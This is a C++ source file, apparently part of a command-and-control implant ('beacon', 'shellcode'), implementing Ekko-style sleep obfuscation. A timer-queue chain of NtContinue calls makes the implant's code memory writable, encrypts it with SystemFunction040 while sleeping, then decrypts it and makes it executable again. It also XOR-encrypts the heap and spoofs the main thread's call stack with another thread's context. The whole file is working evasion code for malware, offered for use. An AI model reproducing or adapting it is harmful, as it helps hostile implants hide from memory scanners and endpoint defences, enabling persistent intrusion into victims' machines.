#include <windows.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>
#include <Sleep.h>

#define EKKO_DELAY_MS  100
#define EKKO_XOR_KEY   0xC0FFEE1337DEADULL

// RtlEncryptMemory / RtlDecryptMemory option: same-process decryption only
#define CRYPT_OPT_SAME_PROCESS 0

// Find another thread in the current process and copy its CONTEXT.
// That context is used as the spoof frame during sleep so the main thread's
// call stack shows a different thread's walk, not the beacon thread's.
static DECLFN BOOL Ekko_GetSpoofCtx( Root::Agent* Self, CONTEXT* ctx ) {
    HANDLE        snap  = nullptr;
    THREADENTRY32 entry;
    BOOL          found = FALSE;
    ULONG         curPid = Self->Session.ProcessID;
    ULONG         curTid = Self->Session.ThreadID;

    entry.dwSize = sizeof(THREADENTRY32);

    snap = Self->Krnl32.CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
    if ( !snap || snap == INVALID_HANDLE_VALUE ) return FALSE;

    if ( !Self->Krnl32.Thread32First( snap, &entry ) ) {
        Self->Ntdll.NtClose( snap );
        return FALSE;
    }

    do {
        if ( entry.th32OwnerProcessID == curPid &&
             entry.th32ThreadID        != curTid )
        {
            HANDLE thd = Self->Krnl32.OpenThread( THREAD_GET_CONTEXT, FALSE, entry.th32ThreadID );
            if ( thd ) {
                ctx->ContextFlags = CONTEXT_ALL;
                if ( NT_SUCCESS( Self->Ntdll.NtGetContextThread( thd, ctx ) ) )
                    found = TRUE;
                Self->Ntdll.NtClose( thd );
                if ( found ) break;
            }
        }
    } while ( Self->Krnl32.Thread32Next( snap, &entry ) );

    Self->Ntdll.NtClose( snap );
    return found;
}


DECLFN void Sleep_Ekko( ULONG ms )
{
    G_AGENT;
    if ( ms == 0 ) return;

    // need cryptbase encrypt/decrypt to be useful; fall back to heap-XOR + Sleep if not
    if ( !Self->Cryptbase.SystemFunction040 || !Self->Cryptbase.SystemFunction041 ) {
        HeapCrypt( EKKO_XOR_KEY );
        Self->Krnl32.Sleep( ms );
        HeapCrypt( EKKO_XOR_KEY );
        return;
    }

    HANDLE   Queue     = nullptr;
    HANDLE   Timer     = nullptr;
    HANDLE   EvCapture = nullptr;
    HANDLE   EvStart   = nullptr;
    HANDLE   EvEnd     = nullptr;
    PVOID    OldProt   = nullptr;
    NTSTATUS st;
    BOOL     hasSpoof  = FALSE;
    UINT16   ic        = 0;
    ULONG    delay     = 0;

    // VirtualAlloc: kept outside the tracked heap so HeapCrypt never encrypts these
    CONTEXT* CtxCapture = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT),      MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
    CONTEXT* CtxBkp     = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT),      MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
    CONTEXT* CtxSpf     = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT),      MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
    CONTEXT* Ctx        = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, 10 * sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );

    if ( !CtxCapture || !CtxBkp || !CtxSpf || !Ctx ) goto _fallback;

    // must be pre-set so NtGetContextThread fills everything when called in chain
    CtxBkp->ContextFlags = CONTEXT_ALL;

    st  = Self->Ntdll.NtCreateEvent( &EvCapture, EVENT_ALL_ACCESS, nullptr, 1, FALSE );
    st |= Self->Ntdll.NtCreateEvent( &EvStart,   EVENT_ALL_ACCESS, nullptr, 1, FALSE );
    st |= Self->Ntdll.NtCreateEvent( &EvEnd,     EVENT_ALL_ACCESS, nullptr, 1, FALSE );
    if ( !NT_SUCCESS(st) || !EvCapture || !EvStart || !EvEnd ) goto _fallback;

    st = Self->Ntdll.RtlCreateTimerQueue( &Queue );
    if ( !NT_SUCCESS(st) || !Queue ) goto _fallback;

    // capture timer pool thread CONTEXT - used as the Rsp/base for all chain frames
    CtxCapture->ContextFlags = CONTEXT_ALL;
    st  = Self->Ntdll.RtlCreateTimer( Queue, &Timer,
            (PVOID)Self->Ntdll.RtlCaptureContext,
            CtxCapture, EKKO_DELAY_MS, 0, WT_EXECUTEINTIMERTHREAD );
    st |= Self->Ntdll.RtlCreateTimer( Queue, &Timer,
            (PVOID)Self->Krnl32.SetEvent,
            EvCapture, EKKO_DELAY_MS * 2, 0, WT_EXECUTEINTIMERTHREAD );
    if ( !NT_SUCCESS(st) ) goto _fallback;

    Self->Ntdll.NtWaitForSingleObject( EvCapture, FALSE, nullptr );

    // try to borrow another thread's context for spoofing the main thread's call stack
    hasSpoof = Ekko_GetSpoofCtx( Self, CtxSpf );

    // seed every chain frame from the captured context, then adjust Rsp to look like a call
    for ( int i = 0; i < 10; i++ ) {
        Mem_Copy( &Ctx[i], CtxCapture, sizeof(CONTEXT) );
        Ctx[i].Rsp -= sizeof(PVOID);
    }

    delay = EKKO_DELAY_MS * 3;

    // --- timer chain (direct Rip assignment: no JMP gadget) ---

    // 0: wait until main thread signals EvStart
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.WaitForSingleObjectEx;
    Ctx[ic].Rcx = (DWORD64)EvStart;
    Ctx[ic].Rdx = (DWORD64)INFINITE;
    Ctx[ic].R8  = (DWORD64)FALSE;
    ic++;

    if ( hasSpoof ) {
        // 1: save main thread's real context before spoofing
        Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Ntdll.NtGetContextThread;
        Ctx[ic].Rcx = (DWORD64)Self->Config.MainThreadHandle;
        Ctx[ic].Rdx = (DWORD64)CtxBkp;
        ic++;

        // 2: replace main thread context with borrowed thread's - spoof the call stack
        Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Ntdll.NtSetContextThread;
        Ctx[ic].Rcx = (DWORD64)Self->Config.MainThreadHandle;
        Ctx[ic].Rdx = (DWORD64)CtxSpf;
        ic++;
    }

    // 3 (or 1): flip shellcode to RW
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.VirtualProtect;
    Ctx[ic].Rcx = (DWORD64)Self->Base.Start;
    Ctx[ic].Rdx = (DWORD64)Self->Base.Length;
    Ctx[ic].R8  = (DWORD64)PAGE_READWRITE;
    Ctx[ic].R9  = (DWORD64)&OldProt;
    ic++;

    // 4 (or 2): encrypt shellcode in place (SystemFunction040 = RtlEncryptMemory)
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Cryptbase.SystemFunction040;
    Ctx[ic].Rcx = (DWORD64)Self->Base.Start;
    Ctx[ic].Rdx = (DWORD64)Self->Base.Length;
    Ctx[ic].R8  = (DWORD64)CRYPT_OPT_SAME_PROCESS;
    ic++;

    // 5 (or 3): actual sleep - WaitForSingleObjectEx on current process pseudo-handle
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.WaitForSingleObjectEx;
    Ctx[ic].Rcx = (DWORD64)(LONG_PTR)-1;
    Ctx[ic].Rdx = (DWORD64)ms;
    Ctx[ic].R8  = (DWORD64)FALSE;
    ic++;

    // 6 (or 4): decrypt shellcode
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Cryptbase.SystemFunction041;
    Ctx[ic].Rcx = (DWORD64)Self->Base.Start;
    Ctx[ic].Rdx = (DWORD64)Self->Base.Length;
    Ctx[ic].R8  = (DWORD64)CRYPT_OPT_SAME_PROCESS;
    ic++;

    // 7 (or 5): restore shellcode to RX
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.VirtualProtect;
    Ctx[ic].Rcx = (DWORD64)Self->Base.Start;
    Ctx[ic].Rdx = (DWORD64)Self->Base.Length;
    Ctx[ic].R8  = (DWORD64)PAGE_EXECUTE_READ;
    Ctx[ic].R9  = (DWORD64)&OldProt;
    ic++;

    if ( hasSpoof ) {
        // 8: restore main thread's real context
        Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Ntdll.NtSetContextThread;
        Ctx[ic].Rcx = (DWORD64)Self->Config.MainThreadHandle;
        Ctx[ic].Rdx = (DWORD64)CtxBkp;
        ic++;
    }

    // last: signal EvEnd - main thread wakes with shellcode decrypted and RX
    Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.SetEvent;
    Ctx[ic].Rcx = (DWORD64)EvEnd;
    ic++;

    // schedule every chain step
    for ( UINT16 i = 0; i < ic; i++, delay += EKKO_DELAY_MS ) {
        Self->Ntdll.RtlCreateTimer( Queue, &Timer,
            (PVOID)Self->Ntdll.NtContinue,
            &Ctx[i], delay, 0, WT_EXECUTEINTIMERTHREAD );
    }

    // XOR heap, trigger chain, wait for EvEnd (chain decrypts .text before signaling)
    HeapCrypt( EKKO_XOR_KEY );
    Self->Ntdll.NtSignalAndWaitForSingleObject( EvStart, EvEnd, FALSE, nullptr );
    HeapCrypt( EKKO_XOR_KEY );

    goto _cleanup;

_fallback:
    HeapCrypt( EKKO_XOR_KEY );
    Self->Krnl32.Sleep( ms );
    HeapCrypt( EKKO_XOR_KEY );

_cleanup:
    if ( Queue )      Self->Ntdll.RtlDeleteTimerQueue( Queue );
    if ( EvCapture )  Self->Ntdll.NtClose( EvCapture );
    if ( EvStart   )  Self->Ntdll.NtClose( EvStart   );
    if ( EvEnd     )  Self->Ntdll.NtClose( EvEnd     );
    if ( CtxCapture ) Self->Krnl32.VirtualFree( CtxCapture, 0, MEM_RELEASE );
    if ( CtxBkp     ) Self->Krnl32.VirtualFree( CtxBkp,    0, MEM_RELEASE );
    if ( CtxSpf     ) Self->Krnl32.VirtualFree( CtxSpf,    0, MEM_RELEASE );
    if ( Ctx        ) Self->Krnl32.VirtualFree( Ctx,        0, MEM_RELEASE );
}
